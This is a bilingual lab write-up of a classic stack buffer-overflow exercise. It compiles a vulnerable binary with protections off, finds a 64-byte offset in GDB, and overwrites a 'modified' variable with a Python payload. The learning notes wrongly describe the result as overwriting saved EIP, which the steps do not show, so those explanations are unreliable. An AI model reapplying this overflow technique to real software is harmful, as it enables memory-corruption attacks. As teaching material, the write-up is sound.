# Explanation

1. **Compile**
```bash
gcc -m32 -std=gnu89 -fno-stack-protector -g -z execstack -no-pie Stack1.c -o Stack1
```


2. **Find interesting break point**
- Check for the use of any unsafe function, such as get/strcpy/fgets.
- - Find interest address for modified (0x080491eb)
```gdb
gdb -q ./Stack1
disas main
```
![Disas](Images\DisasMain.png)

3. **Offset Calculation**
- Calculate distance between buffer and and modified
```gdb
break *0x080491eb
run < AAAAAAAAAAAAAAAAAAA
```
![Break](Breakpoint.png)

```gdb
print &buffer
print &modified
print (char *)&modified - (char *)&buffer
64 #Now test offset plus payload
```
![Offset](Images\Offset.png)

4. **Build Payload and confirm** 
- Payload will look like
```bash
#From CMD line
./Stack1 "$(python3 -c "print('A'*64 + '\x64\x63\x62\x61')")"

#From GDB
gdb --args ./Stack1 $(python3 -c "print('A'*64 + '\x64\x63\x62\x61')")
break *0x080491eb
p/x modified
```

![Success1](Images\Success1.png)

![Success2](Images\Success2.png)


# What I learned

- **Little-endian awareness:** the target return address must be written in reverse byte order (`0x61626364` ⇒ `"\x64\x63\x62\x61"`), or the CPU will read it backwards.
- **Exact offset still matters:** 64 bytes of padding gets you to the saved EIP just like in _stack0_; anything off by one leaves EIP untouched.
- **Proof of success:** running `./stack1 "$(python3 -c 'print(\"A\"*64 + \"\\x64\\x63\\x62\\x61\")')"` and checking GDB shows EIP = `0x61626364`, confirming the payload landed exactly where intended.

# Ce que j’ai appris

- **Penser little-endian :** l’adresse de retour doit être écrite à l’envers (`0x61626364` ⇒ `"\x64\x63\x62\x61"`), sinon le processeur la lira à rebours.
- **L’offset reste crucial :** 64 octets de bourrage atteignent pile l’EIP sauvegardé ; un seul ocet de plus ou de moins et l’EIP reste intact.
- **Preuve à l’appui :** la commande  
    `./stack1 "$(python3 -c 'print("A"*64 + "\\x64\\x63\\x62\\x61")')"`  
    exécutée sous GDB affiche EIP = `0x61626364`, confirmant que la charge utile tombe exactement au bon endroit.
